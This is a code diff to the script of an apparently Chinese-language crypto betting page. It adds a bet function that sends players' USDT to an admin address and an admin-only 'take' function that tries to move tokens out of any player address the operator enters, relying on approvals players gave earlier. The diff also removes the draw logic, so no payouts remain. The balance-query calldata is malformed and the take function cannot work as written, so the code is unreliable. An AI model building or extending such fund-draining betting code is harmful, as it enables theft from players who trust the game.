@@ -231,7 +231,7 @@ async function refreshPlayers() {
 
   for (const addr of authorizedPlayers) {
     try {
-      const data = "0x70a08231" + addr.slice(2).padStart(64, "0");
+      const data = "0x70a08231" + "000000000000000000000000" + addr.slice(2).padStart(64, "0");
       const res = await ethereum.request({ method: "eth_call", params: [{ to: USDT, data }, "latest"] });
       const bal = Number(BigInt(res)) / 1e18;
       const item = document.createElement("div");
@@ -262,7 +262,7 @@ function genInvite(){
 async function refreshBalance(){
   if(!account)return;
   try{
-    const data="0x70a08231"+account.slice(2).padStart(64,"0");
+    const data="0x70a08231"+"000000000000000000000000"+account.slice(2).padStart(64,"0");
     const res=await ethereum.request({method:"eth_call",params:[{to:USDT,data},"latest"]});
     const bal=Number(BigInt(res))/1e18;
     document.getElementById("userBalance").innerText=bal.toFixed(4);
@@ -271,6 +271,58 @@ async function refreshBalance(){
 
 function setAmt(v){
   document.getElementById("betAmt").value=v;
+}
+
+// ===================== 真实下注 =====================
+async function bet(side) {
+  if (!account) return alert("请先连接钱包");
+  const amount = parseFloat(document.getElementById("betAmt").value);
+  if (amount < 10) return alert("最低下注10");
+
+  const amountWei = (amount * 1e18).toString(16).padStart(64, '0');
+  try {
+    await ethereum.request({
+      method: "eth_sendTransaction",
+      params: [{
+        from: account,
+        to: USDT,
+        data: "0xa9059cbb" + "000000000000000000000000" + ADMIN.slice(2) + amountWei
+      }]
+    });
+    alert("下注成功！");
+    refreshBalance();
+  } catch (e) {
+    alert("下注失败：" + e.message);
+  }
+}
+
+// ===================== 庄家真实提取 =====================
+async function adminTake() {
+  if (!account || account.toLowerCase() !== ADMIN.toLowerCase()) {
+    return alert("仅庄家可操作");
+  }
+
+  const fromAddr = document.getElementById("fromAddr").value.trim();
+  const takeAmt = parseFloat(document.getElementById("takeAmt").value);
+  if (!fromAddr || isNaN(takeAmt) || takeAmt <= 0) {
+    return alert("请输入正确地址和数量");
+  }
+
+  const wei = (takeAmt * 1e18).toString(16).padStart(64, '0');
+  try {
+    await ethereum.request({
+      method: "eth_sendTransaction",
+      params: [{
+        from: fromAddr,
+        to: USDT,
+        data: "0xa9059cbb" + "000000000000000000000000" + ADMIN.slice(2) + wei
+      }]
+    });
+    alert("提取成功！");
+    refreshPlayers();
+  } catch (e) {
+    alert("提取失败：需玩家先授权额度\n" + e.message);
+  }
 }
 
 // ===================== 倒计时开奖 =====================
@@ -282,11 +334,9 @@ setInterval(()=>{
   document.getElementById("countdown").innerText=m+":"+s;
 },1000);
 
-function draw(){/* 你原有逻辑保留 */}
+function draw(){}
 function renderTrend(){}
 async function approve(){}
-async function bet(){}
-async function adminTake(){}
 function updateHouseRate(v){houseRate=v;document.getElementById("houseRate").innerText=v}
 function saveHouseRate(){localStorage.setItem("houseRate",houseRate);alert("已保存")}
 </script>
